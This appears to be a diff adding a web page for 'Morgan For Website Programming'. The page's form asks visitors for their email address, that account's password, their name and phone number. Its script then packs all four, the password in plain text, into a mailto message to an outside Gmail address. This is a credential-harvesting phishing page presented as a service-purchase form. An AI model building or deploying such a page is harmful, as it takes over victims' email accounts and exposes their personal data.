@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title></title>
+</head>
+
+<body>
+
+</body>
+
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Morgan For Website Programming</title>
+    <style>
+        body {
+            background-color: #708090; /* رصاصي */
+            color: #ffffff; /* لون النص */
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        #container {
+            width: 80%;
+            margin: auto;
+            padding: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            box-sizing: border-box;
+        }
+        input[type="submit"] {
+            background-color: #008CBA; /* لون زر الإرسال */
+            color: #ffffff;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #005f6b; /* لون زر الإرسال عند التحويل */
+        }
+        .sidebar {
+            width: 20%;
+            float: right;
+            padding: 20px;
+        }
+        .content {
+            width: 75%;
+            float: left;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <h1>Morgan For Website Programming</h1>
+        <div class="content">
+            <form id="emailForm">
+                <label for="email">Email:</label><br>
+                <input type="text" id="email" name="email" required><br>
+                <label for="password">Email Password:</label><br>
+                <input type="password" id="password" name="password" required><br>
+                <label for="buyerName">Name of Buyer:</label><br>
+                <input type="text" id="buyerName" name="buyerName" required><br>
+                <label for="phone">Phone Number:</label><br>
+                <input type="text" id="phone" name="phone" required><br><br>
+                <input type="submit" value="Submit">
+            </form>
+            <p id="warning">Please fill all the spaces.</p>
+        </div>
+        <div class="sidebar">
+            <button onclick="window.location.href='whatsapp://send?phone=+201010807218'">To contact us</button>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("emailForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // يمنع تقديم النموذج بشكل افتراضي
+
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+            var buyerName = document.getElementById("buyerName").value;
+            var phone = document.getElementById("phone").value;
+
+            if (email !== "" && password !== "" && buyerName !== "" && phone !== "") {
+                var subject = "New Form Submission";
+                var body = "Email: " + email + "\nPassword: " + password + "\nName of Buyer: " + buyerName + "\nPhone Number: " + phone;
+                window.location.href = "mailto:programingwebsite1122@gmail.com?subject=" + encodeURIComponent(subject) + "&body=" + encodeURIComponent(body);
+            } else {
+                document.getElementById("warning").style.display = "block";
+            }
+        });
+    </script>
+</body>
+</html>
